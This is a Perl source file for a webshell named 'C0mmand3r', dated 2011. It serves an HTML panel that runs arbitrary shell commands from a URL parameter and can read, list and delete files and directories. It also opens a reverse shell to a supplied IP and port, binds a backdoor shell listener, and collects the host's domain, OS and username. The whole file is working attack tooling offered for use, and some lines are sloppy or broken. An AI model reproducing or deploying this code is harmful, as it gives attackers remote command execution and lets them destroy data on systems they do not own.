#!usr/bin/perl
#
#C0mmand3r (C) Doddy HAckman 2011
#Version 0.1
#
#A simple WebShell in Perl
#
#

use IO::Socket;
use CGI;
use Cwd;
use HTML::Entities;
use URI::Escape;
use Win32;
use Net::hostent; 

my $port = rep();

sub rep {
unless($ARGV[0]) {
return int("666"); #Your Can Edit 666
} else {
return int($ARGV[0]);
}
}

print "\n\n#########################################\n\n";
print "C0mmand3r (C) Doddy HAckman 2011\n\n\n";
print "[+] Starting the webshell on port $port\n\n";
print "#########################################\n\n";


my $sock = new IO::Socket::INET(
LocalHost => 'localhost',
LocalPort => $port,
Proto     => 'tcp',
Listen    => SOMAXCONN,
Reuse     => 1);


while ($jebus = $sock->accept()) {


print $jebus "HTTP/1.1 200/OK\r\nContent-type:text/html\r\n\r\n";
#print $jebus "HTTP/1.1 200/OK\r\nContent-type:application/w-www-form-urlencoded\r\n\r\n";
next if $slave=fork;

close $sock;

while ($response = <$jebus>) {

chomp($response);

my %rta;


if ($response=~/GET/ig) {
capturar($response);
}


sub capturar {
my $aa = shift;
chomp $aa;
if ($aa=~/GET \/(.*) HTTP\/1.1/ig) {
my $todo = $1;
if ($todo=~/\?(.*)=(.*)&(.*)=(.*)/ig) {
$rta{$1} = $2;
$rta{$3} = $4;
}
if ($todo=~/\?(.*)=(.*)/ig) {
$rta{$1} = $2;
} 
}


}

print $jebus "

<html><body><title>Commander (C) Doddy Hackman 2011</title>

<style type=text/css>

.main {
margin			: -287px 0px 0px -490px;
border			: White solid 1px;
BORDER-COLOR: cyan;
}


#pie {
position: absolute;
bottom: 0;
}

body,a:link {
background-color: #000000;
color:cyan;
Courier New;
cursor:crosshair;
font-size: small;
}

input,table.outset,table.bord,table,textarea,select {
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
background-color:black;color:cyan; 
border: solid 1px cyan;
border-color:cyan
}

a:link,a:visited,a:active {
color: cyan;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>


<h2><center>Commander WebShell</center></h2>

";


if ($rta{'loadfile'}) {

my $file = uri_unescape($rta{'loadfile'});


print $jebus "<br><h2><center>File ".$file."</h2></center><br><br>";

if (-f $file) {

print $jebus "<center><textarea name=codefile cols=70 rows=70>";

open (FILE,$file);
@words = <FILE>;
close FILE;

for (@words) {
print $jebus HTML::Entities::encode($_);
}
print $jebus "
</textarea></center>
</center><br><br>
</form>
";

exit(1);
}
}

print $jebus "
<br><br>
<b>Console</b>
<br><br>
<fieldset>";


if ($rta{'cmd'}) {
print $jebus qx($rta{'cmd'});
}


elsif ($rta{'loadir'}) {
my $dir = uri_unescape($rta{'loadir'});
print "recibi $dir\n\n";
if (-d $dir) {
opendir DIR,$dir;
my @archivos = readdir DIR;
close DIR;

for(@archivos) {

if (-d $_) {
print $jebus "<b>".$_."</b><br>"; 	
} else {
print $jebus $_."<br>";
}}}}

elsif ($rta{'delfile'}) {

my $file = uri_unescape($rta{'delfile'});


if (-f $file) {

if (unlink($file)) {
print $jebus "<script>alert('File Deleted');</script>";
} else {
print $jebus "<script>alert('Error');</script>";
}
}
}

elsif ($rta{'deldir'}) {

my $dir = uri_unescape($rta{'deldir'});

if (-d $dir) {
if (rmdir($dir)) {
print $jebus "<script>alert('Directory Deleted');</script>";
} else {
print $jebus "<script>alert('Error');</script>";
}
}
}

elsif ($rta{'ipconnect'}) {
print $rta{'ipconnect'}."\n";
print $rta{'port'}."\n";
conectar($rta{'ipconnect'},$rta{'port'});
tipo();

sub conectar {
socket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(REVERSE, sockaddr_in($_[1],inet_aton($_[0])));
open (STDIN,">&REVERSE");
open (STDOUT,">&REVERSE");
open (STDERR,">&REVERSE");
}

sub tipo {
print "\n[*] Reverse Shell Starting...\n\n";
if ($^O =~/Win32/ig) {
infowin();
system("cmd.exe");
} else {
infolinux();
#root();  
system("export TERM=xterm;exec sh -i");
}
}

sub infowin {
print "[+] Domain Name : ".Win32::DomainName()."\n";
print "[+] OS Version : ".Win32::GetOSName()."\n";
print "[+] Username : ".Win32::LoginName()."\n\n\n";
}

sub infolinux {
print "[+] System information\n\n";
system("uname -a");
print "\n\n";
}
}

elsif($rta{'portbind'}) {

$backdoor = IO::Socket::INET->new(
Proto     => 'tcp',
LocalPort => $rta{'portbind'},
Listen    => SOMAXC,
Reuse     => 1);


while ($jesus = $backdoor->accept()) {
$jesus->autoflush(1);
print $jesus "[*] Heaven_Door Online\n[*] Port : 25256\n[*] PID : ".$$."\n\n";
print $jesus "Welcome  ".$jesus->peerhost."\n\n";
&extras;
$dir = getcwd();
print $jesus $dir.">>";
while (<$jesus>) {
my $yeah = qx($_);
print $jesus "\n\n".$yeah."\n\n";
print $jesus $dir.">>";
}
}

sub extras {

if ($^O =~//ig) {
print $jesus "[+] Domain Name : ".Win32::DomainName()."\n";
print $jesus "[+] OS Version : ".Win32::GetOSName()."\n";
print $jesus "[+] Username : ".Win32::LoginName()."\n\n\n";
} else {
$s =  qx("uname -a");
print $jesus "--==System Info==--\n\n".$s;
}
}
} else {

opendir DIR,getcwd();
my @archivos = readdir DIR;
close DIR;

for(@archivos) {
if (-d $_) {
print $jebus "<b>".$_."</b><br>"; 	
} else {
print $jebus $_."<br>";
}}

}

print $jebus "</fieldset>
<br><br>
<form action='' method=GET>
<b>Command</b> : <input type=text name=cmd size=100 value=ver><input type=submit value=Send><br>
</form>
<form action='' method=GET>
<B>Load directory</B> : <input type=text size=100 name=loadir value=".getcwd()."><input type=submit value=Load>
</form>
<form action='' method=GET>
<b>Load File</b> : <input type=text size=100 name=loadfile value=".getcwd()."><input type=submit value=Load>
</form>
<form action='' method=GET>
<b>Delete File</b> : <input type=text size=100 name=delfile value=".getcwd()."><input type=submit value=Del>
</form>
<form action='' method=GET>
<b>Delete Directory</b> : <input type=text size=100 name=deldir><input type=submit value=Del>
</form>
<br><br><b>ReverseShell</b><br><br>
<form action='' method=GET>
<b>Your IP</B> : <input type=text name=ipconnect value=localhost><br>
<b>Port</b> : <input type=text name=port value=666><br>
<br><input type=submit value=Connect></form><br><br>

<b>BindPort</b><br><br>
<form action='' method=GET>
<b>Port</b> : <input type=text name=portbind value=666><br>
<br><input type=submit value=Bind></form><br><br>


</body></html>
";

$jebus->close;
	
}
		
} continue {
$jebus->close;
}

# ¿ The End ? 